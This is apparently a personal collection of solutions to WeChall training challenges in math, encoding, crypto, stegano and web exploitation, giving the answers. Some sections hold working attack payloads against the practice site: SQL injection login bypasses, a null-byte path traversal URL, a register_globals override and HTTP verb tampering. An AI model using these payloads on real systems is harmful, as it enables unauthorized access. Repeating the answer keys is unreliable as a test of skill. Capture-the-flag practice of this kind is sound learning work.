

### Prime Factory (Training, Math)
Your task is simple:
Find the first two primes above 1 million, whose separate digit sums are also prime.
As example take 23, which is a prime whose digit sum, 5, is also prime.
The solution is the concatination of the two numbers,
Example: If the first number is 1,234,567
and the second is 8,765,432,
your solution is 12345678765432
```js
function isPrime(num) {
  for(var i = 2; i <= Math.sqrt(num); i++)
    if(num % i === 0) return false;
  return num !== 1;
}

function digitSum(num) {
    var sum = 0;
    while (0 < num) {
        sum += num % 10;
        num = parseInt(num / 10);
    }
    return sum;
}

var i;
var primes = [];
for (i = 1000000; i < 2000000; i++) {
    if (2 === primes.length) {
        break;
    }

    if (isPrime(i) && isPrime(digitSum(i))) {
        primes.push(i);
    }
}

var answer = primes.join('');
"10000331000037"
```
```
10000331000037
```


### Encodings I (Training, Encoding)
10101001101000110100111100110100
00011101001100101111100011101000
10000011010011110011010000001101
11010110111000101101001111010001
00000110010111011101100011110111
11100100110010111001000100000110
00011110011110001111010011101001
01011100100000101100111011111110
10111100100100000111000011000011
11001111100111110111110111111100
10110010001000001101001111001101
00000110010111000011110011111100
11110011111010011000011110010111
0100110010111100100101110

Length: 441 = 7 * 7 * 3 * 3

Tool: http://www.wechall.net/applet/JPK_406.jar

BitsPerBlock: 7

Binary -> Binary Format

Binary -> Binary to Ascii

This text is 7-bit encoded ascii. Your password is easystarter.

```js
var input = `
10101001101000110100111100110100
00011101001100101111100011101000
10000011010011110011010000001101
11010110111000101101001111010001
00000110010111011101100011110111
11100100110010111001000100000110
00011110011110001111010011101001
01011100100000101100111011111110
10111100100100000111000011000011
11001111100111110111110111111100
10110010001000001101001111001101
00000110010111000011110011111100
11110011111010011000011110010111
0100110010111100100101110
`;
var answer = input.replace(/\n/g, '').match(/(.{1,7})/g).map(function(bin){
    return String.fromCharCode(parseInt(bin, 2));
}).join('');
"This text is 7-bit encoded ascii. Your password is easystarter."
```
```
easystarter
```


### Programming 1 (Training, Coding)
```js
$.ajax({
    url: 'http://www.wechall.net/challenge/training/programming1/index.php?action=request'
}).done(function(ans) {
    location.href = 'http://www.wechall.net/challenge/training/programming1/index.php?answer=' + ans;
});
```


### Regex (Training, Regex)
online tool: https://regex101.com/
```
Level 1: /^$/
Level 2: /^wechall$/
Level 3: /^wechall4?\.(?:jpg|gif|tiff|bmp|png)$/
Level 4: /^(wechall4?)\.(?:jpg|gif|tiff|bmp|png)$/
```


### Programming 1 (Training, Coding)
```js
$.ajax({
    url: 'http://www.wechall.net/challenge/training/programming1/index.php?action=request'
}).done(function(ans) {
    location.href = 'http://www.wechall.net/challenge/training/programming1/index.php?answer=' + ans;
});
```


### Training: PHP LFI (Exploit, PHP, Training)
LFI vulnerability: https://en.wikipedia.org/wiki/File_inclusion_vulnerability

http://www.wechall.net/challenge/training/php/lfi/up/index.php?show=source
```
http://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00
```


### PHP 0817 (PHP, Exploit)
LFI vulnerability: https://en.wikipedia.org/wiki/File_inclusion_vulnerability
```php
...
switch ($which) {
    case 0: // <-- issue !
    case 1:
    case 2:
    ...
}
```
```
http://www.wechall.net/challenge/php0817/index.php?which=solution
```


### Training: Crypto - Transposition I (Crypto, Training)
Ciphertext:

oWdnreuf.lY uoc nar ae dht eemssga eaw yebttrew eh nht eelttre sra enic roertco drre . Ihtni koy uowlu dilekt  oes eoyrup sawsro don:wf napnsecanb.i

Tool: http://tholman.com/other/transposition/

Proposed Key length:　6

1 0 3 2 5 4

```
fannpesacbni
```


### Training: Crypto - Substitution I (Crypto, Training)
Simple_substitution: https://en.wikipedia.org/wiki/Substitution_cipher#Simple_substitution

Ciphertext:

IV GAO PHLRCAGV CFJ VFZ EPX MOPJ GARU LV BMROXJ R PL RLKMOUUOJ DOMV NOHH JFXO VFZM UFHZGRFX QOV RU FFUXJXMBRBHR GARU HRGGHO EAPHHOXCO NPU XFG GFF APMJ NPU RG

Tool: https://quipqiup.com/

Plaintext:

BY THE ALMIGHTY GOD YOU CAN READ THIS MY FRIEND I AM IMPRESSED VERY WELL DONE YOUR SOLUTION KEY IS OOSNDNRFIFLI THIS LITTLE CHALLENGE WAS NOT TOO HARD WAS IT

```
OOSNDNRFIFLI
```


### Training: Crypto - Caesar II (Crypto, Training)
Random Ciphertext

key is between 26 and 128

```py
import sys

hexCipher = """
11 39 39 2E 20 34 39 2C 76 20 43 39 3F 20 3D 39
36 40 2F 2E 20 39 38 2F 20 37 39 3C 2F 20 2D 32
2B 36 36 2F 38 31 2F 20 33 38 20 43 39 3F 3C 20
34 39 3F 3C 38 2F 43 78 20 1E 32 33 3D 20 39 38
2F 20 41 2B 3D 20 30 2B 33 3C 36 43 20 2F 2B 3D
43 20 3E 39 20 2D 3C 2B 2D 35 78 20 21 2B 3D 38
71 3E 20 33 3E 09 20 7B 7C 02 20 35 2F 43 3D 20
33 3D 20 2B 20 3B 3F 33 3E 2F 20 3D 37 2B 36 36
20 35 2F 43 3D 3A 2B 2D 2F 76 20 3D 39 20 33 3E
20 3D 32 39 3F 36 2E 38 71 3E 20 32 2B 40 2F 20
3E 2B 35 2F 38 20 43 39 3F 20 3E 39 39 20 36 39
38 31 20 3E 39 20 2E 2F 2D 3C 43 3A 3E 20 3E 32
33 3D 20 37 2F 3D 3D 2B 31 2F 78 20 21 2F 36 36
20 2E 39 38 2F 76 20 43 39 3F 3C 20 3D 39 36 3F
3E 33 39 38 20 33 3D 20 2E 32 2E 3C 2D 3C 32 33
31 2C 37 2F 78
"""

hexCipherArr = hexCipher.replace('\n',' ').strip().split(" ")
cipherArr = []

for h in hexCipherArr:
    cipherArr.append(int(h, 16))

for key in range(26, 128 + 1):
    for c in cipherArr:
        sys.stdout.write(chr(c + key))
    print
```

Good job you solved one more challenge in your journey This one was fairly easy to crack Wasn't it keys is a quite small keyspace so it shouldn't have taken you too long to decrypt this message Well done your solution is dhdrcrhigbme

```
dhdrcrhigbme (Random)
```


### Training: Crypto - Digraphs (Crypto, Training)
Random Ciphertext

keyword: congratulations

```py

def split_len(seq, length):
    return [seq[i:i+length] for i in range(0, len(seq), length)]

cipher = "qxxulthugapjpwrrecpjpwjhxultpe upxurr zgbftxgaghxdpwbfzg pwljjhpe nhbfpepepjhubf perrtxtxbfpepeelrrececgh rapjpe ltxupw pwxuxu zgjheleljhtxrrecpw bfjhpwljbfgasp yxpjpe jhpwtw rabfececsp huxuxuzg joxuee rfltpwbfga pwljjhpe dobfghyxxugazg pjpe pexuecrrpwjhxultre txgaxubfecjhhupeeepepepe"
allChar = 'abcdefghijklmnopqrstuvwxyz0123456789'
idx = 0
map = {}
singleCipher = ''

cipherDobuleWords = cipher.split(" ")
cipherSingleWords = []

for doubleWords in cipherDobuleWords:
    doubleWord = split_len(doubleWords, 2)
    for d in doubleWord:
        if d not in map:
            map[d] = allChar[idx]
            idx = idx + 1
        singleCipher += map[d]
    singleCipher += ' '

print singleCipher
```

Congratulations. You decrypted this message successfully. Was not too difficult either, was it? Well, good job. Enter this keyword as solution: croeligsbsss.

Tool: https://quipqiup.com/

```
croeligsbsss
```


### Training: MySQL I (MySQL, Exploit, Training)
```php
$username = Common::getPostString('username');
$password = Common::getPostString('password', false);
...
$password = md5($password);
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
...
```

```
username=admin'or'1'='1
username=admin' --
```


### Training: MySQL II (MySQL, Exploit, Training)
```php
    $query = "SELECT * FROM users WHERE username='$username'";
    if (false === ($result = $db->queryFirst($query))) {
		return false;
	}
	### This is the new check ###
	if ($result['password'] !== $password) {
		return false;
	} #  End of the new code  ###
```

md5(NULL) = d41d8cd98f00b204e9800998ecf8427e

```
username=1' union select 1,'admin','d41d8cd98f00b204e9800998ecf8427e&password=
```


### Training: WWW-Basics (HTTP, Training)
Server:
python: BaseHTTPServer

```nc
while true; do (echo -e 'HTTP/1.1 200 OK\r\n'; echo -e "My name is Ranger and iChall.\c") | nc -l localhost 6666; done
```

Client:
python: requests
```curl
curl -b cookie.file -c cookie.file -X POST -d "username=Ranger" -d "password=********" -d "login=Login" http://www.wechall.net/login

curl -b cookie.file -c cookie.file -X POST -d "port=80&go=" http://www.wechall.net/challenge/training/www/basic/index.php
```

### Training: Register Globals (Exploit, PHP, Training)
```html
if (isset($login))
{
    ...
    if (strtolower($login[0]) === 'admin') {
```

```
...&login[0]=admin
```


### Training: Math Pyramid (Math, Training)
h = 1 / sqrt(2) * a
V = 1 / 3 * a ^ 2 * h = sqrt(2)/6*a^3
```
a^3/18^.5
```


### Training: Baconian (Stegano, Encoding, Crypto, Training)
https://en.wikipedia.org/wiki/Bacon%27s_cipher

http://rumkin.com/tools/cipher/baconian.php

very well done fellow hacker the secret keyword is bcgflbnebllh

```
bcgflbnebllh
```


### Training: LSB (Stegano, Image, Training)
Tool: Stegsolve (Green Plane 1)

http://www.caesum.com/handbook/Stegsolve.jar

```
HMRDMMIDHIHN
```


### Training: GPG (Crypto, Training)
Gmail -> FlowCrypt (extension)


### Limited Access (Exploit, HTTP)
Limit GET, but not POST!

```
curl -b cookie.file -c cookie.file -X POST -d "username=Ranger" -d "password=********" -d "login=Login" http://www.wechall.net/login

curl -b cookie.file -c cookie.file -X POST http://www.wechall.net/challenge/wannabe7331/limited_access/protected/protected.php
```


### Limited Access Too (Exploit, HTTP)
Limit GET POST HEAD PUT DELETE CONNECT OPTIONS, but not VIEW!

```
curl -b cookie.file -c cookie.file -X POST -d "username=Ranger" -d "password=********" -d "login=Login" http://www.wechall.net/login

curl -b cookie.file -c cookie.file -X VIEW http://www.wechall.net/challenge/wannabe7331/limited_access_too/protected/protected.php
```


### Training: Warchall - The Beginning (Realistic, Linux, Shell, Warchall)
Enable logfile EMails -> (RE)SET your SSH account -> ssh -p 19198 ranger@warchall.net

```bash
#Solution0
cat /home/level/0/README.txt

#Solution1
ls -R /home/level/1
/home/level/1/blue/pill/hats/gray/solution/is/SOLUTION.txt

#Solution2
cat /home/level/2/.porb/.solution

#Solution3
cat /home/level/3/.bash_history

#Solution4
chmod 777 /home/user/ranger/level/4/README.txt
cat /home/user/ranger/level/4/README.txt

#Solution5
chmod 700 /home/user/ranger/level
cat /home/user/ranger/level/5/solution.txt
```

```
bitwarrior,LameStartup,HiddenIsConfig,RepeatingHistory,AndIknowchown,OhRightThePerms
```


#Repeating History (Research)
www/challenge/subversive/repeating/what_do_you_want_here.php -> InDaxIn

www/challenge/subversive/history/install.php -> NothingHereMoveAlong (in history)

```
InDaxInNothingHereMoveAlong
```


### PHP My Admin (Research)
```
https://pma.wechall.net/
```


### Training: Caterpillar (Stegano)
Tool: GIMP
```
```


### AUTH me (HTTP, Training)
browser import https://authme.wechall.net/challenge/space/auth_me/find_me/client.p12

https://authme.wechall.net/challenge/space/auth_me/www/index.php


### Interesting (Fun, Exploit)
https://www.wechall.net/index.php?mo=Profile&me=POIS&minlat=-90&maxlat=90&minlon=-180&maxlon=180

pp_uid: "11212"

```
acknowledge,beauty,charming,depth,elegance,fantasy,guidance,hackerspace,inspiration
```


### Wanda (Fun, Exploit)
https://wanda.gizmore.org/


### Railsbin (Exploit)
https://github.com/gizmore/railsbin

http://railsbin.wechall.net/

